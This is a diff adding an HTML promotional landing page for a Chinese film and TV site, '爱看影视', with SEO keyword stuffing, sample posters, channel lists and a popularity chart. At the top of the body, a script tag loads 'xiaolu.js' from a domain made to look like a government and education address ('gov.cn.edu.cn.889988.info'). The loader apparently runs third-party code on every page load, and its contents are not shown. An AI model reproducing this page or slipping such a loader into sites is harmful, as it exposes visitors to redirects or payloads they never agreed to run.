@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>爱看影视 - 好剧好片都在这 | 爱看影视官网</title>
+<meta name="keywords" content="爱看影视, 爱看影视官网, 好剧好片, 在线影视, 影视大全, 高清影视, 影视推荐">
+<meta name="description" content="爱看影视 - 爱看影视官网，好剧好片都在这！汇聚电影、剧集、综艺、动漫、纪录片等丰富内容，精选优质影视推荐。官网地址：https://aikanyingshi-wap.github.io">
+<meta name="author" content="爱看影视">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://aikanyingshi-wap.github.io">
+<style>
+  :root{
+    --bg:#14080a; --bg2:#241013; --red:#e11d48; --red2:#be123c; --orange:#f97316; --amber:#f59e0b;
+    --txt:#fff1f2; --muted:#e4a0ac; --card:rgba(225,29,72,.12); --line:rgba(244,63,94,.25);
+    --r:18px;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:"SF Pro Text",-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:var(--bg);color:var(--txt);line-height:1.75;overflow-x:hidden;
+    background-image:
+      radial-gradient(ellipse at 15% 8%,rgba(225,29,72,.34),transparent 44%),
+      radial-gradient(ellipse at 88% 20%,rgba(249,115,22,.20),transparent 40%),
+      linear-gradient(172deg,#0a0406,var(--bg) 48%,var(--bg2));
+    background-attachment:fixed;
+  }
+  a{color:inherit;text-decoration:none;}
+  .wrap{max-width:1120px;margin:0 auto;padding:0 16px;}
+
+  /* 顶部 */
+  .top{position:sticky;top:0;z-index:99;background:rgba(20,8,10,.9);backdrop-filter:blur(16px);border-bottom:1px solid var(--line);}
+  .top-in{max-width:1120px;margin:0 auto;padding:13px 16px;display:flex;align-items:center;justify-content:space-between;}
+  .brand{display:flex;align-items:center;gap:11px;}
+  .brand .logo{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,var(--orange),var(--red));display:grid;place-items:center;font-size:18px;box-shadow:0 0 18px rgba(225,29,72,.5);}
+  .brand b{font-size:20px;font-weight:900;letter-spacing:1px;}
+  .brand b i{color:var(--amber);font-style:normal;}
+  .nav ul{display:flex;gap:2px;list-style:none;flex-wrap:wrap;}
+  .nav a{padding:8px 13px;border-radius:10px;font-size:14px;color:var(--muted);transition:.25s;}
+  .nav a:hover{color:#fff;background:var(--card);}
+
+  /* Hero 胶片风 */
+  .hero{padding:92px 0 100px;text-align:center;position:relative;overflow:hidden;}
+  .hero::before{content:"";position:absolute;inset:0;
+    background:repeating-linear-gradient(90deg,transparent 0 34px,rgba(255,255,255,.035) 34px 35px);
+    mask-image:linear-gradient(180deg,transparent,#000,transparent);-webkit-mask-image:linear-gradient(180deg,transparent,#000,transparent);}
+  .hero-in{max-width:1120px;margin:0 auto;padding:0 16px;position:relative;z-index:2;}
+  .hero .love{font-size:52px;margin-bottom:14px;animation:pluse 2.4s ease-in-out infinite;}
+  @keyframes pluse{0%,100%{transform:scale(1)}50%{transform:scale(1.14)}}
+  .hero .badge{display:inline-block;padding:6px 16px;border-radius:99px;background:var(--card);border:1px solid var(--line);color:var(--amber);font-size:13px;margin-bottom:16px;}
+  .hero h1{font-size:clamp(30px,7.4vw,56px);font-weight:900;line-height:1.16;margin-bottom:16px;}
+  .hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--orange),var(--red),var(--amber));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .hero .sub{color:var(--muted);max-width:630px;margin:0 auto 18px;font-size:16px;}
+  .hero .url{display:inline-block;padding:12px 22px;border-radius:12px;background:rgba(225,29,72,.10);border:1px dashed var(--line);color:var(--amber);font-size:14px;}
+  .btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-top:26px;}
+  .btn{padding:14px 34px;border-radius:12px;font-weight:800;font-size:15px;border:0;cursor:pointer;transition:.3s;}
+  .btn-g{background:linear-gradient(135deg,var(--orange),var(--red));color:#fff;box-shadow:0 8px 26px rgba(225,29,72,.42);}
+  .btn-g:hover{transform:translateY(-3px);box-shadow:0 12px 32px rgba(225,29,72,.6);}
+  .btn-o{background:transparent;color:#fff;border:1px solid var(--line);}
+  .btn-o:hover{background:var(--card);}
+
+  section.blk{padding:64px 0;}
+  .cap{text-align:center;margin-bottom:42px;}
+  .cap .kicker{font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--amber);display:block;margin-bottom:9px;}
+  .cap h2{font-size:clamp(22px,5vw,34px);font-weight:900;}
+  .cap p{color:var(--muted);font-size:15px;margin-top:8px;}
+
+  /* 栏目一 精选推荐 —— 横向胶片条 + 海报卡 */
+  #pick .reel{display:flex;gap:16px;overflow-x:auto;padding:6px 4px 20px;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch;}
+  #pick .reel::-webkit-scrollbar{height:8px;}
+  #pick .reel::-webkit-scrollbar-thumb{border-radius:99px;background:rgba(244,63,94,.35);}
+  .poster{flex:0 0 210px;scroll-snap-align:start;border-radius:var(--r);overflow:hidden;border:1px solid var(--line);background:rgba(225,29,72,.08);transition:.35s;}
+  .poster .cover{height:280px;display:grid;place-items:center;font-size:52px;color:#fff;
+    background:linear-gradient(150deg,var(--c1,rgba(225,29,72,.7)),var(--c2,rgba(190,18,60,.95)));}
+  .poster:nth-child(1) .cover{--c1:rgba(249,115,22,.7);--c2:rgba(225,29,72,.95);}
+  .poster:nth-child(2) .cover{--c1:rgba(244,63,94,.65);--c2:rgba(159,18,57,.95);}
+  .poster:nth-child(3) .cover{--c1:rgba(251,146,60,.7);--c2:rgba(194,65,12,.95);}
+  .poster:nth-child(4) .cover{--c1:rgba(225,29,72,.6);--c2:rgba(136,19,55,.95);}
+  .poster:nth-child(5) .cover{--c1:rgba(253,164,175,.6);--c2:rgba(190,18,60,.95);}
+  .poster:nth-child(6) .cover{--c1:rgba(249,115,22,.65);--c2:rgba(159,18,57,.95);}
+  .poster .meta{padding:14px 16px;}
+  .poster .meta h4{font-size:16px;font-weight:800;}
+  .poster .meta span{font-size:12px;color:var(--muted);}
+  .poster:hover{transform:translateY(-6px);box-shadow:0 14px 32px rgba(225,29,72,.35);border-color:var(--red);}
+
+  /* 栏目二 内容频道 —— 竖向列表带索引 */
+  #channel .list{max-width:880px;margin:0 auto;border:1px solid var(--line);border-radius:20px;overflow:hidden;background:rgba(225,29,72,.06);}
+  .ci{display:flex;align-items:center;gap:18px;padding:18px 22px;border-bottom:1px solid rgba(244,63,94,.15);transition:.3s;}
+  .ci:last-child{border-bottom:0;}
+  .ci:hover{background:rgba(225,29,72,.12);}
+  .ci .idx{width:44px;height:44px;border-radius:12px;display:grid;place-items:center;font-weight:900;font-size:18px;color:#fff;background:linear-gradient(135deg,var(--orange),var(--red));flex:0 0 auto;}
+  .ci .tx{flex:1;}
+  .ci .tx h4{font-size:16px;font-weight:800;}
+  .ci .tx p{font-size:13px;color:var(--muted);}
+  .ci .ar{font-size:20px;color:var(--amber);}
+
+  /* 栏目三 热门榜单 —— 横向柱状图 */
+  #rank .bars{max-width:860px;margin:0 auto;}
+  .bar-row{display:flex;align-items:center;gap:14px;margin-bottom:14px;}
+  .bar-row .no{width:34px;height:34px;border-radius:9px;display:grid;place-items:center;font-weight:900;font-size:15px;background:rgba(225,29,72,.15);border:1px solid var(--line);flex:0 0 auto;}
+  .bar-row.g1 .no{background:linear-gradient(135deg,var(--amber),var(--orange));color:#3a1100;border:0;}
+  .bar-row .nm{flex:0 0 130px;font-size:15px;font-weight:700;}
+  .bar-row .track{flex:1;height:26px;background:rgba(225,29,72,.08);border-radius:99px;overflow:hidden;}
+  .bar-row .fill{height:100%;border-radius:99px;background:linear-gradient(90deg,var(--orange),var(--red));width:0;animation:grow 1.4s ease forwards;}
+  .bar-row .vl{flex:0 0 52px;text-align:right;font-size:13px;color:var(--muted);}
+  @keyframes grow{to{width:var(--w)}}
+
+  /* 栏目四 观看优势 —— 三点式居中叙述 */
+  #why .tri{max-width:920px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:20px;}
+  .pt{padding:26px 24px;border-radius:var(--r);background:linear-gradient(165deg,rgba(249,115,22,.14),rgba(225,29,72,.06));border:1px solid var(--line);text-align:center;transition:.3s;}
+  .pt:hover{transform:translateY(-5px);box-shadow:0 12px 28px rgba(225,29,72,.28);}
+  .pt .ic{font-size:40px;margin-bottom:10px;}
+  .pt h4{font-size:17px;font-weight:900;margin-bottom:6px;}
+  .pt p{font-size:14px;color:var(--muted);}
+
+  /* 栏目五 关于 */
+  #about .abt{max-width:840px;margin:0 auto;padding:38px;border-radius:22px;background:linear-gradient(155deg,rgba(225,29,72,.14),rgba(249,115,22,.12));border:1px solid var(--line);}
+  #about .abt .lead{font-size:19px;color:#fff;font-weight:900;margin-bottom:14px;}
+  #about .abt strong{color:var(--amber);}
+
+  footer{background:#0a0406;border-top:1px solid var(--line);padding:36px 0 40px;text-align:center;}
+  footer .fn{font-size:20px;font-weight:900;margin-bottom:8px;}
+  footer .fn i{color:var(--amber);font-style:normal;}
+  footer .fu{color:var(--amber);font-size:14px;margin-bottom:16px;}
+  .fl{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;}
+  .fl a{padding:7px 15px;border-radius:10px;font-size:13px;background:var(--card);border:1px solid var(--line);color:var(--muted);}
+  .fl a:hover{color:#fff;}
+  footer .cp{font-size:13px;color:var(--muted);margin-top:16px;}
+
+  @media(max-width:640px){
+    .top-in{flex-direction:column;gap:10px;}
+    .nav ul{justify-content:center;}
+    .hero{padding:58px 0 80px;}
+    section.blk{padding:44px 0;}
+    .poster{flex:0 0 168px;}
+    .poster .cover{height:224px;font-size:42px;}
+    .ci .tx p{display:none;}
+    .bar-row .nm{flex:0 0 96px;font-size:14px;}
+    .hero::before{display:none;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="top">
+  <div class="top-in">
+    <div class="brand">
+      <div class="logo">❤️</div>
+      <b>爱看<i>影视</i></b>
+    </div>
+    <nav class="nav" aria-label="主导航">
+      <ul>
+        <li><a href="#pick">精选推荐</a></li>
+        <li><a href="#channel">内容频道</a></li>
+        <li><a href="#rank">热门榜单</a></li>
+        <li><a href="#why">为什么爱看</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<main>
+
+  <section class="hero" aria-labelledby="ht">
+    <div class="hero-in">
+      <div class="love">❤️</div>
+      <span class="badge">好剧好片 · 都在这</span>
+      <h1 id="ht">因为 <em>爱看</em>，所以精选</h1>
+      <p class="sub">爱看影视，汇聚电影、剧集、综艺、动漫、纪录片等丰富内容，每一部都值得一看，让每一次打开都不辜负期待。</p>
+      <div class="url">🔗 爱看影视官网：https://aikanyingshi-wap.github.io</div>
+      <div class="btns">
+        <a class="btn btn-g" href="#pick">看看精选</a>
+        <a class="btn btn-o" href="#channel">浏览频道</a>
+      </div>
+    </div>
+  </section>
+
+  <section id="pick" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">EDITOR'S PICK</span>
+        <h2>精选推荐</h2>
+        <p>编辑团队用心挑选，每一部都值得你点开</p>
+      </div>
+      <div class="reel">
+        <article class="poster"><div class="cover">🎬</div><div class="meta"><h4>光影故事</h4><span>剧情 · 高分力荐</span></div></article>
+        <article class="poster"><div class="cover">🎭</div><div class="meta"><h4>欢笑剧场</h4><span>喜剧 · 轻松解压</span></div></article>
+        <article class="poster"><div class="cover">🔥</div><div class="meta"><h4>热血沸腾</h4><span>动作 · 高能不断</span></div></article>
+        <article class="poster"><div class="cover">💫</div><div class="meta"><h4>浪漫时刻</h4><span>爱情 · 甜到心里</span></div></article>
+        <article class="poster"><div class="cover">🕵️</div><div class="meta"><h4>烧脑悬疑</h4><span>悬疑 · 反转不断</span></div></article>
+        <article class="poster"><div class="cover">🚀</div><div class="meta"><h4>奇幻冒险</h4><span>科幻 · 脑洞大开</span></div></article>
+      </div>
+    </div>
+  </section>
+
+  <section id="channel" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">CHANNELS</span>
+        <h2>内容频道</h2>
+        <p>爱看影视精心划分频道，精准找到你的心头好</p>
+      </div>
+      <div class="list">
+        <div class="ci"><div class="idx">01</div><div class="tx"><h4>电影频道</h4><p>院线大片、经典老片、独立佳作，一次看个够。</p></div><span class="ar">›</span></div>
+        <div class="ci"><div class="idx">02</div><div class="tx"><h4>剧集频道</h4><p>国产剧、美剧、韩剧、日剧，高分好剧随时追。</p></div><span class="ar">›</span></div>
+        <div class="ci"><div class="idx">03</div><div class="tx"><h4>综艺频道</h4><p>真人秀、选秀、脱口秀，快乐随时随地。</p></div><span class="ar">›</span></div>
+        <div class="ci"><div class="idx">04</div><div class="tx"><h4>动漫频道</h4><p>国漫精品、日本新番、欧美动画，分季整理。</p></div><span class="ar">›</span></div>
+        <div class="ci"><div class="idx">05</div><div class="tx"><h4>纪录频道</h4><p>自然、人文、科技，用影像看世界。</p></div><span class="ar">›</span></div>
+        <div class="ci"><div class="idx">06</div><div class="tx"><h4>少儿频道</h4><p>亲子动画、启蒙教育，陪伴孩子成长。</p></div><span class="ar">›</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">POPULAR RANKING</span>
+        <h2>热门榜单</h2>
+        <p>大家都在看什么？看看爱看影视的实时热度</p>
+      </div>
+      <div class="bars">
+        <div class="bar-row g1"><div class="no">1</div><div class="nm">热播剧场</div><div class="track"><div class="fill" style="--w:96%"></div></div><div class="vl">9.8</div></div>
+        <div class="bar-row g1"><div class="no">2</div><div class="nm">院线大片</div><div class="track"><div class="fill" style="--w:88%"></div></div><div class="vl">9.4</div></div>
+        <div class="bar-row"><div class="no">3</div><div class="nm">高分剧集</div><div class="track"><div class="fill" style="--w:80%"></div></div><div class="vl">9.1</div></div>
+        <div class="bar-row"><div class="no">4</div><div class="nm">轻松综艺</div><div class="track"><div class="fill" style="--w:72%"></div></div><div class="vl">8.8</div></div>
+        <div class="bar-row"><div class="no">5</div><div class="nm">动漫新番</div><div class="track"><div class="fill" style="--w:64%"></div></div><div class="vl">8.5</div></div>
+        <div class="bar-row"><div class="no">6</div><div class="nm">纪录探索</div><div class="track"><div class="fill" style="--w:55%"></div></div><div class="vl">8.2</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="why" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">WHY AIKAN</span>
+        <h2>为什么爱看</h2>
+        <p>三个理由，让你爱上打开爱看影视的每一刻</p>
+      </div>
+      <div class="tri">
+        <div class="pt"><div class="ic">🎯</div><h4>精选内容</h4><p>编辑团队层层筛选，拒绝注水，只留精品。</p></div>
+        <div class="pt"><div class="ic">⚡</div><h4>流畅体验</h4><p>加载迅速、切换顺滑，告别卡顿与等待。</p></div>
+        <div class="pt"><div class="ic">🌙</div><h4>沉浸观看</h4><p>高清画质、无广告打扰，安心享受每一帧。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="about" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">ABOUT US</span>
+        <h2>关于爱看影视</h2>
+      </div>
+      <div class="abt">
+        <p class="lead">爱看，是一种生活态度。</p>
+        <p><strong>爱看影视</strong>是一个为影视爱好者打造的观看平台，以"好剧好片都在这"为初心，汇聚<strong>电影、剧集、综艺、动漫、纪录片、少儿</strong>等多频道内容，用心精选每一部作品。</p>
+        <p>我们相信，好的影视作品值得被看见。爱看影视坚持精选优质内容，为你提供流畅、高清、沉浸的观看体验。</p>
+        <p>访问 <strong>爱看影视官网 https://aikanyingshi-wap.github.io</strong>，和我们一起，发现更多好看的影视。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fn">爱看<i>影视</i></div>
+    <div class="fu">官网：https://aikanyingshi-wap.github.io</div>
+    <div class="fl">
+      <a href="#pick">精选推荐</a>
+      <a href="#channel">内容频道</a>
+      <a href="#rank">热门榜单</a>
+      <a href="#why">为什么爱看</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="cp">© 2026 爱看影视 爱看影视官网 保留所有权利 · 好剧好片都在这</div>
+  </div>
+</footer>
+
+</body>
+</html>
